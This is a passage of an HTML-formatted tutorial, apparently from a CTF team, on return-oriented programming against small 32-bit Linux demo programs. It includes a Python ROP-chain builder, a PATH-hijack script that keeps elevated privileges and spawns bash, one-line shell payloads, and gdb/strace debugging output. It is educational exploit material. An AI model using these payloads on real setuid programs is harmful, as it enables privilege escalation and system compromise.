&lt;p&gt;In our case, we want the argument to be &lt;code&gt;0xdeadbeef&lt;/code&gt; we want the return address to be a &lt;code&gt;pop; ret&lt;/code&gt; gadget. This will remove &lt;code&gt;0xdeadbeef&lt;/code&gt; from the stack and return to the next gadget on the stack. We thus have a gadget to call &lt;code&gt;add_bin(0xdeadbeef)&lt;/code&gt; that looks like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| 0xdeadbeef            |
| &amp;lt;address of pop; ret&amp;gt; |
| &amp;lt;address of add_bin&amp;gt;  |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since &lt;code&gt;add_sh(0xcafebabe, 0x0badf00d)&lt;/code&gt; use two arguments, we need a &lt;code&gt;pop; pop; ret&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| 0x0badf00d                 |
| 0xcafebabe                 |
| &amp;lt;address of pop; pop; ret&amp;gt; |
| &amp;lt;address of add_sh&amp;gt;        |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When we put these together, our payload looks like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;address of exec_string&amp;gt;     |
| 0x0badf00d                   |
| 0xcafebabe                   |
| &amp;lt;address of pop; pop; ret&amp;gt;   |
| &amp;lt;address of add_sh&amp;gt;          |
| 0xdeadbeef                   |
| &amp;lt;address of pop; ret&amp;gt;        |
| &amp;lt;address of add_bin&amp;gt;         |
| 0x42424242 (fake saved %ebp) |
| 0x41414141 ...               |
|   ... (0x6c bytes of &amp;#39;A&amp;#39;s)   |
|   ... 0x41414141             |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This time we will use a &lt;code&gt;python&lt;/code&gt; wrapper (which will also show off the use of the very useful &lt;code&gt;struct&lt;/code&gt; python module).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;

&lt;span class="c1"&gt;# These values were found with `objdump -d a.out`.&lt;/span&gt;
&lt;span class="n"&gt;pop_ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x8048474&lt;/span&gt;
&lt;span class="n"&gt;pop_pop_ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x8048473&lt;/span&gt;
&lt;span class="n"&gt;exec_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x08048414&lt;/span&gt;
&lt;span class="n"&gt;add_bin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x08048428&lt;/span&gt;
&lt;span class="n"&gt;add_sh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x08048476&lt;/span&gt;

&lt;span class="c1"&gt;# First, the buffer overflow.&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mh"&gt;0x6c&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;BBBB&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# The add_bin(0xdeadbeef) gadget.&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;add_bin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pop_ret&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# The add_sh(0xcafebabe, 0x0badf00d) gadget.&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;add_sh&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pop_pop_ret&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xcafebabe&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xbadf00d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Our final destination.&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;exec_string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./a.out &lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Some useful tricks&lt;/h1&gt;
&lt;p&gt;One common protection you will see on modern systems is for &lt;code&gt;bash&lt;/code&gt; to drop privileges if it is executed with a higher effective user id than saved user id. This is a little bit annoying for attackers, because &lt;code&gt;/bin/sh&lt;/code&gt; frequently is a symlink to &lt;code&gt;bash&lt;/code&gt;. Since &lt;code&gt;system&lt;/code&gt; internally executes &lt;code&gt;/bin/sh -c&lt;/code&gt;, this means that commands run from &lt;code&gt;system&lt;/code&gt; will have privileges dropped!&lt;/p&gt;
&lt;p&gt;In order to circumvent this, we will instead use &lt;code&gt;execlp&lt;/code&gt; to execute a &lt;code&gt;python&lt;/code&gt; script we control in our local directory. We will demonstrate this and a few other tricks while exploiting the following simple program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;vulnerable_read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;STDIN_FILENO&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;vulnerable_read&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The general strategy will be to execute a &lt;code&gt;python&lt;/code&gt; script via &lt;code&gt;execlp&lt;/code&gt;, which searches the &lt;code&gt;PATH&lt;/code&gt; environment variable for an executable of the correct name.&lt;/p&gt;
&lt;h2&gt;Unix filenames&lt;/h2&gt;
&lt;p&gt;We know how to find the address of &lt;code&gt;execlp&lt;/code&gt; using &lt;code&gt;gdb&lt;/code&gt;, but what file do we execute? The trick is to realize that Unix filenames can have (almost) arbitrary characters in them. We then just have to find a string that functions as a valid filename somewhere in memory. Fortunately, those are are all over the text segment of program. In &lt;code&gt;gdb&lt;/code&gt;, we can get all the information we need:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q ./a.out
&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) bread main&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x80483fd&lt;/span&gt;
&lt;span class="go"&gt;(gdb) run&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /home/ppp/a.out &lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x080483fd in main ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) print execlp&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x5564b6f0 &amp;lt;execlp&amp;gt;
&lt;span class="go"&gt;(gdb) x/s main&lt;/span&gt;
&lt;span class="go"&gt;0x80483fa &amp;lt;main&amp;gt;:    &amp;quot;U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We will execute the file &lt;code&gt;U\211\345\203\344\360\350\317\377\377\377\270&lt;/code&gt;. We first create this file in some temporary directory and make sure it is executable&lt;sup id="fnref-10"&gt;&lt;a class="footnote-ref" href="#fn-10"&gt;7&lt;/a&gt;&lt;/sup&gt; and in our &lt;code&gt;PATH&lt;/code&gt;. We want a bash shell, so for now the file will simply ensure &lt;code&gt;bash&lt;/code&gt; will not drop privileges:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; vim &lt;span class="s1"&gt;$&amp;#39;U\211\345\203\344\360\350\317\377\377\377\270&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; cat &lt;span class="s1"&gt;$&amp;#39;U\211\345\203\344\360\350\317\377\377\377\270&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;!/usr/bin/python
&lt;span class="go"&gt;import os&lt;/span&gt;
&lt;span class="go"&gt;os.setresuid(os.geteuid(), os.geteuid(), os.geteuid())&lt;/span&gt;
&lt;span class="go"&gt;os.execlp(&amp;quot;bash&amp;quot;, &amp;quot;bash&amp;quot;)&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; chmod +x &lt;span class="s1"&gt;$&amp;#39;U\211\345\203\344\360\350\317\377\377\377\270&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Keeping &lt;code&gt;stdin&lt;/code&gt; open&lt;/h2&gt;
&lt;p&gt;Before we can exploit this, we have to be aware of one last trick. We want to avoid closing &lt;code&gt;stdin&lt;/code&gt; when we exec our shell. If we just naively piped output to our program through &lt;code&gt;python&lt;/code&gt;, we would see &lt;code&gt;bash&lt;/code&gt; execute and then quit immediately. What we do instead is we use a special &lt;code&gt;bash&lt;/code&gt; sub shell and &lt;code&gt;cat&lt;/code&gt; to keep &lt;code&gt;stdin&lt;/code&gt; open&lt;sup id="fnref-11"&gt;&lt;a class="footnote-ref" href="#fn-11"&gt;8&lt;/a&gt;&lt;/sup&gt;. The following command concatenates the output of the &lt;code&gt;python&lt;/code&gt; command with standard in, thus keeping it open for &lt;code&gt;bash&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;cat &amp;lt;(python -c &amp;#39;print &amp;quot;my_payload&amp;quot;&amp;#39;) - | ./a.out&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now that we know all the tricks we need, we can exploit the program. First, we plan what we want the stack to look like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| 0x0 (NULL)                              |
| 0x80483fa &amp;lt;address of the weird string&amp;gt; |
| 0x80483fa &amp;lt;address of the weird string&amp;gt; |
| 0x5564b6f0 &amp;lt;address of execlp&amp;gt;          |
| 0x42424242 &amp;lt;fake old %ebp&amp;gt;              |
| 0x41414141 ...                          |
|   ... (0x6c bytes of &amp;#39;A&amp;#39;s)              |
|   ... 0x41414141                        |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Putting it all together, we get our shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\xf0\xb6\x64\x55&amp;quot; + &amp;quot;\xfa\x83\x04\x08&amp;quot;*2 + &amp;quot;\x00\x00\x00\x00&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - &lt;span class="p"&gt;|&lt;/span&gt; ./a.out
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To recap, this exploit required us to use the following tricks in addition to ROP:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Executing &lt;code&gt;python&lt;/code&gt; since &lt;code&gt;bash&lt;/code&gt; drops privileges&lt;/li&gt;
&lt;li&gt;Controlling the &lt;code&gt;PATH&lt;/code&gt; and executing a file in a directory we control with &lt;code&gt;execlp&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Choosing a filename that was a "string" of bytes from the code segment.&lt;/li&gt;
&lt;li&gt;Keeping &lt;code&gt;stdin&lt;/code&gt; open using &lt;code&gt;bash&lt;/code&gt; sub shells and &lt;code&gt;cat&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Debugging&lt;/h1&gt;
&lt;h2&gt;&lt;code&gt;gdb&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;When you exploit doesn't work the first time, there are some tricks you can use to debug and figure out what is going on. The first thing you should do is run the exploit in &lt;code&gt;gdb&lt;/code&gt; with your payload. You should break on the return address of the function you are overflowing and print the stack to make sure it is what you expect. In the following example, I forgot to do &lt;code&gt;ulimit -s unlimited&lt;/code&gt; before calculating &lt;code&gt;libc&lt;/code&gt; addresses so the address of &lt;code&gt;execlp&lt;/code&gt; is wrong:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
&lt;span class="go"&gt;Reading symbols from /tmp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) disas vulnerable_read&lt;/span&gt;
&lt;span class="go"&gt;Dump of assembler code for function vulnerable_read:&lt;/span&gt;
&lt;span class="go"&gt;   0x080483d4 &amp;lt;+0&amp;gt;:  push   %ebp&lt;/span&gt;
&lt;span class="go"&gt;   0x080483d5 &amp;lt;+1&amp;gt;:  mov    %esp,%ebp&lt;/span&gt;
&lt;span class="go"&gt;   0x080483d7 &amp;lt;+3&amp;gt;:  sub    $0x88,%esp&lt;/span&gt;
&lt;span class="go"&gt;   0x080483dd &amp;lt;+9&amp;gt;:  movl   $0xc8,0x8(%esp)&lt;/span&gt;
&lt;span class="go"&gt;   0x080483e5 &amp;lt;+17&amp;gt;: lea    -0x6c(%ebp),%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x080483e8 &amp;lt;+20&amp;gt;: mov    %eax,0x4(%esp)&lt;/span&gt;
&lt;span class="go"&gt;   0x080483ec &amp;lt;+24&amp;gt;: movl   $0x0,(%esp)&lt;/span&gt;
&lt;span class="go"&gt;   0x080483f3 &amp;lt;+31&amp;gt;: call   0x80482f0 &amp;lt;read@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x080483f8 &amp;lt;+36&amp;gt;: leave  &lt;/span&gt;
&lt;span class="go"&gt;   0x080483f9 &amp;lt;+37&amp;gt;: ret    &lt;/span&gt;
&lt;span class="go"&gt;End of assembler dump.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) break *0x080483f9&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x80483f9&lt;/span&gt;
&lt;span class="go"&gt;(gdb) run &amp;lt;in&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /tmp/a.out &amp;lt;in&lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x080483f9 in vulnerable_read ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/4a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xffffd6ec: 0x5564b6f0  0x80483fa &amp;lt;main&amp;gt;    0x80483fa &amp;lt;main&amp;gt;    0x0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It should look like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;(gdb) x/4a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xffffd6ec: 0x5564b6f0 &amp;lt;execlp&amp;gt; 0x80483fa &amp;lt;main&amp;gt;    0x80483fa &amp;lt;main&amp;gt;    0x0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;code&gt;strace&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;Another really useful tool is &lt;code&gt;strace&lt;/code&gt;, which will print out every syscall made by the program. In the following example, I forgot to set &lt;code&gt;PATH&lt;/code&gt;: the exploit worked but it was unable to find my file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\xf0\xb6\x64\x55&amp;quot; + &amp;quot;\xfa\x83\x04\x08&amp;quot;*2 + &amp;quot;\x00\x00\x00\x00&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; strace ./a.out
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;read(0, &amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;..., 200) = 129&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/usr/local/sbin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/usr/local/bin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/usr/sbin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/usr/bin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/sbin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/bin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
&lt;span class="go"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In this case, I forgot to keep &lt;code&gt;stdin&lt;/code&gt; open, so it happily executes my &lt;code&gt;python&lt;/code&gt; program and &lt;code&gt;bash&lt;/code&gt; and then immediately &lt;code&gt;exit&lt;/code&gt;s after a 0 byte &lt;code&gt;read&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\xf0\xb6\x64\x55&amp;quot; + &amp;quot;\xfa\x83\x04\x08&amp;quot;*2 + &amp;quot;\x00\x00\x00\x00&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; strace ./a.out
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;read(0, &amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;..., 200) = 129&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/tmp/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = 0&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;geteuid()                               = 1337&lt;/span&gt;
&lt;span class="go"&gt;geteuid()                               = 1337&lt;/span&gt;
&lt;span class="go"&gt;geteuid()                               = 1337&lt;/span&gt;
&lt;span class="go"&gt;setresuid(1337, 1337, 1337)             = 0&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/bin/bash&amp;quot;, [&amp;quot;bash&amp;quot;], [/* 21 vars */]) = 0&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;read(0, &amp;quot;&amp;quot;, 1)                          = 0&lt;/span&gt;
&lt;span class="go"&gt;exit_group(0)                           = ?&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/ASLR"&gt;ASLR&lt;/a&gt; is the technique where portions of the program, such as the stack or the heap, are placed at a random location in memory when the program is first run. This causes the address of stack buffers, allocated objects, etc to be randomized between runs of the program and prevents the attacker.&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-2"&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/Data_Execution_Prevention"&gt;DEP&lt;/a&gt; is the technique where memory can be either writable or executable, but not both. This prevents an attacker from filling a buffer with shellcode and executing it. While this usually requires hardware support, it is quite commonly used on modern programs. &amp;#160;&lt;a class="footnote-backref" href="#fnref-2" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-3"&gt;
&lt;p&gt;To make life easier for us, we compile with &lt;code&gt;gcc -m32 -fno-stack-protector easy_rop.c&lt;/code&gt;. &amp;#160;&lt;a class="footnote-backref" href="#fnref-3" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-4"&gt;
&lt;p&gt;You'll note that we use print the exploit string in a python subshell.  This is so we can print escape characters and use arbitrary bytes in our payload. We also surround the subshell in double quotes in case the payload had whitespace in it.&amp;#160;&lt;a class="footnote-backref" href="#fnref-4" title="Jump back to footnote 4 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-7"&gt;
&lt;p&gt;These can be found in the &lt;code&gt;libc&lt;/code&gt; library itself: &lt;code&gt;ldd a.out&lt;/code&gt; tells us that the library can be found at &lt;code&gt;/lib/i386-linux-gnu/libc.so.6&lt;/code&gt;. We can use &lt;code&gt;objdump&lt;/code&gt;, &lt;code&gt;nm&lt;/code&gt;, &lt;code&gt;strings&lt;/code&gt;, etc. on this library to directly find any information we need. These addresses will all be offset from the base of &lt;code&gt;libc&lt;/code&gt; in memory and can be used to compute the actual addresses by adding the offset of &lt;code&gt;libc&lt;/code&gt; in memory.&amp;#160;&lt;a class="footnote-backref" href="#fnref-7" title="Jump back to footnote 5 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-8"&gt;
&lt;p&gt;I believe someone even &lt;a href="http://cseweb.ucsd.edu/~hovav/papers/rbss12.html"&gt;tried to prove&lt;/a&gt; that ROP is turing complete.   &amp;#160;&lt;a class="footnote-backref" href="#fnref-8" title="Jump back to footnote 6 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-10"&gt;
